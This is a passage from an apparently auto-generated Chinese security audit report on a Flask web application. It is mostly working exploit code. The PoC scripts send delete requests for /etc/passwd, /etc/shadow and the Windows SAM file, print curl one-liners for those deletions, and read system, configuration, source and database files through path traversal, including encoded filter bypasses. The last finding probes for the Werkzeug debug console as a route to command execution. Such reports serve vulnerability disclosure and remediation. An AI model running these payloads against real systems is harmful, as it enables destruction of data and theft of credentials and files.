    with tempfile.NamedTemporaryFile(delete=False, suffix='.txt') as f:
        temp_path = f.name
        f.write(b"This is a test file for PoC")
    
    print(f"[+] 创建临时文件: {temp_path}")
    print(f"[+] 文件存在: {os.path.exists(temp_path)}")
    
    # 发送删除请求
    try:
        response = requests.get(f"{TARGET_URL}/delete", params={"path": temp_path})
        print(f"[+] 响应状态码: {response.status_code}")
        print(f"[+] 响应内容: {response.text}")
        print(f"[+] 文件已删除: {not os.path.exists(temp_path)}")
    except requests.exceptions.ConnectionError:
        print("[-] 连接失败，请确保目标应用正在运行")

# ============================================
# PoC 2: 路径遍历删除（演示）
# ============================================
def poc_path_traversal_delete():
    """
    演示2: 尝试删除系统关键文件（仅演示请求构造）
    前置条件: 目标应用运行中，且运行权限足够
    注意: 此PoC仅发送请求，不实际执行危险操作
    """
    print("\n[PoC 2] 路径遍历删除演示")
    print("[!] 警告: 以下请求仅用于演示漏洞存在性")
    print("[!] 实际利用可能导致系统损坏")
    
    # 构造各种路径遍历payload
    payloads = [
        "/etc/passwd",           # Linux密码文件
        "/etc/shadow",           # Linux影子文件
        "C:\\Windows\\System32\\config\\SAM",  # Windows SAM文件
        "../../../etc/passwd",    # 相对路径遍历
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",  # Windows路径遍历
    ]
    
    for payload in payloads:
        print(f"\n[*] 尝试删除: {payload}")
        try:
            # 仅发送请求，不检查实际结果（避免破坏系统）
            response = requests.get(f"{TARGET_URL}/delete", params={"path": payload})
            print(f"    HTTP状态码: {response.status_code}")
            print(f"    响应: {response.text[:100]}...")
        except requests.exceptions.ConnectionError:
            print("    [-] 连接失败")
            break

# ============================================
# PoC 3: 批量文件删除（DoS攻击演示）
# ============================================
def poc_batch_delete():
    """
    演示3: 批量删除文件造成拒绝服务
    前置条件: 目标应用运行中
    注意: 此PoC仅演示请求构造，不实际执行
    """
    print("\n[PoC 3] 批量文件删除DoS攻击演示")
    print("[!] 警告: 此PoC仅展示攻击向量")
    
    # 创建多个临时文件
    temp_files = []
    for i in range(5):
        with tempfile.NamedTemporaryFile(delete=False, suffix=f'_poc_{i}.txt') as f:
            temp_files.append(f.name)
    
    print(f"[+] 创建了 {len(temp_files)} 个临时文件用于演示")
    
    # 批量删除
    for file_path in temp_files:
        try:
            response = requests.get(f"{TARGET_URL}/delete", params={"path": file_path})
            print(f"[+] 删除 {file_path}: {response.status_code}")
        except requests.exceptions.ConnectionError:
            print("[-] 连接失败")
            break
    
    print(f"[+] 所有临时文件已清理")

# ============================================
# PoC 4: 利用curl命令（命令行方式）
# ============================================
def poc_curl_example():
    """
    演示4: 使用curl命令进行利用
    前置条件: 系统安装curl
    """
    print("\n[PoC 4] curl命令利用示例")
    print("[*] 以下curl命令可用于直接利用漏洞:")
    print()
    print("  # 删除指定文件")
    print(f"  curl '{TARGET_URL}/delete?path=/tmp/test.txt'")
    print()
    print("  # 路径遍历删除")
    print(f"  curl '{TARGET_URL}/delete?path=../../../etc/passwd'")
    print()
    print("  # Windows路径遍历")
    print(f"  curl '{TARGET_URL}/delete?path=..\\..\\..\\windows\\system32\\config\\SAM'")

# ============================================
# 主函数
# ============================================
if __name__ == "__main__":
    print("\n[!] 免责声明: 此PoC仅供安全研究使用")
    print("[!] 请勿用于非法用途")
    print("[!] 使用前请确保已获得授权\n")
    
    # 执行PoC演示
    poc_delete_temp_file()
    poc_path_traversal_delete()
    poc_batch_delete()
    poc_curl_example()
    
    print("\n" + "=" * 60)
    print("PoC执行完成")
    print("=" * 60)
```

---

### VULN-06AA9F17 - 路径遍历

- **严重等级:** HIGH
- **文件位置:** `web\app.py:113`
- **数据流:** 用户通过URL路径参数report_path传入 -> 直接拼接到full_path中 -> 传递给send_file()发送文件
- **判断理由:** report_path参数直接来自用户请求URL，未进行任何路径校验或过滤。攻击者可以通过构造包含'../'的路径来访问reports目录之外的文件，例如访问/etc/passwd或项目中的敏感文件。虽然使用了os.path.join，但用户输入中的'../'仍可导致路径逃逸。

**代码片段:**
```
@app.route("/report/<path:report_path>")
def view_report(report_path):
    full_path = os.path.join(os.path.dirname(__file__), "..", "reports", report_path)
    if os.path.exists(full_path):
        return send_file(full_path)
    return "报告未找到", 404
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - 路径遍历漏洞PoC
# 目标：http://target:5000/report/<path>

# PoC 1: 读取 /etc/passwd (Linux系统)
echo "PoC 1: 读取 /etc/passwd"
curl -v "http://target:5000/report/../../../../etc/passwd"

# PoC 2: 读取 Windows系统文件 (如C:\Windows\win.ini)
echo "PoC 2: 读取 Windows系统文件"
curl -v "http://target:5000/report/../../../../Windows/win.ini"

# PoC 3: 读取项目敏感文件 (如config/settings.py)
echo "PoC 3: 读取项目配置文件"
curl -v "http://target:5000/report/../config/settings.py"

# PoC 4: 读取源代码文件 (如web/app.py自身)
echo "PoC 4: 读取源代码文件"
curl -v "http://target:5000/report/../web/app.py"

# PoC 5: 尝试读取数据库文件 (如SQLite)
echo "PoC 5: 读取数据库文件"
curl -v "http://target:5000/report/../../../../var/data/database.sqlite"

# PoC 6: 使用URL编码绕过简单过滤 (如果存在)
echo "PoC 6: URL编码路径遍历"
curl -v "http://target:5000/report/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"

# PoC 7: 双重编码尝试
echo "PoC 7: 双重编码"
curl -v "http://target:5000/report/%252e%252e%252fetc/passwd"
```

---

### VULN-88BF1858 - 不安全的配置

- **严重等级:** MEDIUM
- **文件位置:** `web\app.py:127`
- **数据流:** 从config.settings导入WEB_CONFIG -> 直接用于app.run配置
- **判断理由:** 如果WEB_CONFIG中的debug设置为True，Flask会启用调试模式，可能暴露详细的错误信息和调试控制台，导致信息泄露或远程代码执行。此外，如果host设置为0.0.0.0，应用会监听所有网络接口，增加攻击面。

**代码片段:**
```
app.run(
    host=WEB_CONFIG.get("host", "127.0.0.1"),
    port=WEB_CONFIG.get("port", 5000),
    debug=WEB_CONFIG.get("debug", False),
)
```

**PoC代码:**
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC for VULN-88BF1858 - Flask不安全配置漏洞
仅供安全研究使用，请勿用于非法用途
"""

import requests
import sys
import time

# ============================================
# PoC 1: 检测调试模式是否开启
# ============================================
def check_debug_mode(target_url):
    """
    检测Flask调试模式是否开启
    通过访问不存在的路由触发404错误，观察是否返回调试信息
    """
    print("[*] 正在检测调试模式...")
    
    # 访问一个不存在的路由
    test_url = f"{target_url}/nonexistent_path_12345"
    
    try:
        response = requests.get(test_url, timeout=5)
        
        # 调试模式开启的特征：
        # 1. 返回详细的错误信息（包含代码上下文）
        # 2. 响应中包含 "Debugger" 或 "Werkzeug" 字样
        # 3. 状态码为500（内部服务器错误）而非404
        
        if response.status_code == 500:
            if "Debugger" in response.text or "Werkzeug" in response.text:
                print("[!] 检测到调试模式已开启！")
                print(f"[!] 响应中包含调试信息: {response.text[:500]}...")
                return True
            elif "Traceback" in response.text:
                print("[!] 检测到调试模式可能开启（返回了Traceback信息）")
                return True
        
        print("[+] 调试模式未开启（返回了正常的404响应）")
        return False
        
    except requests.exceptions.ConnectionError:
        print("[-] 无法连接到目标服务器")
        return None
    except Exception as e:
        print(f"[-] 检测过程中发生错误: {e}")
        return None


# ============================================
# PoC 2: 检测是否监听所有网络接口
# ============================================
def check_host_binding(target_url):
    """
    检测Flask应用是否监听所有网络接口（0.0.0.0）
    通过检查响应头中的Server信息
    """
    print("[*] 正在检测网络接口绑定...")
    
    try:
        response = requests.get(target_url, timeout=5)
        
        # 检查响应头
        server_header = response.headers.get('Server', '')
        print(f"[+] 服务器响应头: {server_header}")
        
        # 如果应用监听0.0.0.0，可以从其他网络接口访问
        # 这里通过检查是否可以从外部IP访问来判断
        print("[*] 提示: 如果应用监听0.0.0.0，可以从任何网络接口访问")
        print("[*] 请检查是否可以从其他机器访问此服务")
        
        return True
        
    except Exception as e:
        print(f"[-] 检测过程中发生错误: {e}")
        return None


# ============================================
# PoC 3: 利用调试控制台执行命令（如果调试模式开启）
# ============================================
def exploit_debug_console(target_url):
    """
    利用Flask调试控制台执行任意Python代码
    注意：这需要调试模式开启且能够访问调试控制台
    """
    print("[*] 尝试利用调试控制台...")
    
    # Flask调试控制台通常位于 /console
    console_url = f"{target_url}/console"
    
    try:
        response = requests.get(console_url, timeout=5)
        
        if response.status_code == 200 and "Werkzeug" in response.text:
            print("[!] 发现调试控制台！")
            print(f"[!] 控制台URL: {console_url}")
            print("[*] 可以通过以下方式执行命令：")
            print("    import os")
            print("    os.system('whoami')")
            return True
        else:
            print("[+] 未发现调试控制台")
            return False
            
    except Exception as e:
        print(f"[-] 访问控制台时发生错误: {e}")
        return None


# ============================================
# PoC 4: 模拟配置注入攻击
# ============================================
def simulate_config_injection():
    """
    模拟攻击者修改配置文件以启用调试模式
    这展示了配置文件的脆弱性
    """
    print("[*] 模拟配置注入攻击...")
    print("[*] 假设攻击者能够修改 config/settings.py 文件")
    print("[*] 修改后的配置：")
    print("""
    # 原始配置
    WEB_CONFIG = {
        "host": "127.0.0.1",
        "port": 5000,
        "debug": False
    }
    
    # 恶意配置
    WEB_CONFIG = {
        "host": "0.0.0.0",  # 监听所有接口
        "port": 5000,
        "debug": True  # 启用调试模式
    }
    """)
    print("[!] 配置修改后，应用将：")
    print("    1. 监听所有网络接口（0.0.0.0）")
    print("    2. 启用调试模式")
    print("    3. 暴露调试控制台")
    print("    4. 可能被远程代码执行攻击")


# ============================================
# 主函数
# ============================================
def main():
    """主函数"""
    print("=" * 60)
    print("Flask不安全配置漏洞 PoC (VULN-88BF1858)")
    print("仅供安全研究使用")
    print("=" * 60)
    
    # 获取目标URL
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = "http://127.0.0.1:5000"
        print(f"[*] 使用默认目标: {target_url}")
        print("[*] 请通过命令行参数指定目标: python poc.py http://target:port")
    
    print()
    
    # 执行检测
    debug_enabled = check_debug_mode(target_url)
    print()
    
    host_binding = check_host_binding(target_url)
    print()
    
    if debug_enabled:
        console_found = exploit_debug_console(target_url)
        print()
    
    # 显示配置注入模拟
    simulate_config_injection()
    print()
    
    # 总结
    print("=" * 60)
    print("检测结果总结：")
    print(f"  调试模式: {'已开启' if debug_enabled else '未开启'}")
    print(f"  网络绑定: {'已检测' if host_binding else '未检测'}")
    print("=" * 60)
    print("\n[!] 安全建议：")
    print("    1. 确保生产环境中 debug=False")
    print("    2. 限制监听地址为 127.0.0.1")
    print("    3. 对配置文件进行访问控制")
    print("    4. 使用环境变量而非配置文件控制敏感设置")


if __name__ == "__main__":
    main()

```

---



*报告由 CodeSentinel 自动生成*
